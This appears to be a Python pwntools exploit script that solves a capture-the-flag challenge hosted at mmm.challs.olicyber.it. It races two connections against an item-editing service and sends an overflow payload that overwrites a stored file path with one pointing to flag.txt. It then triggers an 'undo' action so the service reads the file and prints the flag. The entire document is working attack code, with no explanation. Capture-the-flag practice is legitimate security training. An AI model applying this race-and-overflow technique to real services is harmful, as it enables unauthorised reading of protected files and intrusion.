from pwn import *
import re

HOST = 'mmm.challs.olicyber.it'
PORT = 16009

context.log_level = 'error'

MENU_PROMPT = b'Make your selection:'


def recv_menu(p):
    p.recvuntil(MENU_PROMPT)


def create_item(p):
    recv_menu(p)
    p.sendline(b'1')
    p.recvuntil(b'Insert item price:')
    p.sendline(b'1')
    p.recvuntil(b'Insert description')
    # description length 1 -> old_len=1
    p.sendline(b'A')
    data = p.recvuntil(MENU_PROMPT)
    m_id = re.search(rb'Item ID: ([A-Za-z0-9]{32})', data)
    m_tok = re.search(rb'Item secret token: ([A-Za-z0-9]{32})', data)
    if not m_id or not m_tok:
        raise RuntimeError('Failed to parse item ID/token')
    return m_id.group(1), m_tok.group(1)


def start_edit_wait_token(p, item_id):
    # assume we are already at menu prompt
    p.sendline(b'2')
    p.recvuntil(b'Enter item ID:')
    p.sendline(item_id)
    p.recvuntil(b'Enter token:')


def edit_desc_and_save(p, item_id, token, payload):
    recv_menu(p)
    p.sendline(b'2')
    p.recvuntil(b'Enter item ID:')
    p.sendline(item_id)
    p.recvuntil(b'Enter token:')
    p.sendline(token)
    p.recvuntil(MENU_PROMPT)
    p.sendline(b'2')
    p.recvuntil(b'Insert new description')
    # send payload (no NULs) + newline
    p.send(payload + b'\n')
    p.recvuntil(MENU_PROMPT)
    p.sendline(b'3')
    p.recvuntil(MENU_PROMPT)


def extract_flag(data):
    flat = data.replace(b'\n', b'')
    m = re.search(rb'flag\{[A-Za-z0-9_]+\}', flat)
    return m.group(0).decode() if m else None


def main():
    # connection A
    pA = remote(HOST, PORT)
    item_id, token = create_item(pA)

    # start edit on A, wait for token prompt
    start_edit_wait_token(pA, item_id)

    # connection B modifies file with overflow payload
    pB = remote(HOST, PORT)
    path = ('./' * 12 + 'flag.txt').encode()
    if len(path) != 32:
        raise RuntimeError('Path length is not 32')

    filler = b'A' * 0x20
    payload = filler + path + token[:31]
    if len(payload) != 95:
        raise RuntimeError('Unexpected payload length')

    edit_desc_and_save(pB, item_id, token, payload)
    pB.sendline(b'0')
    pB.close()

    # finish token check on A (uses original token)
    pA.sendline(token)
    data = pA.recvuntil(MENU_PROMPT)

    # undo changes to reload flag.txt without token
    pA.sendline(b'4')
    data += pA.recvuntil(MENU_PROMPT)

    flag = extract_flag(data)
    if flag:
        print(flag)
    else:
        print('Flag not found. Output snippet:')
        print(data.decode(errors='ignore'))

    pA.sendline(b'0')
    pA.sendline(b'0')
    pA.close()


if __name__ == '__main__':
    main()
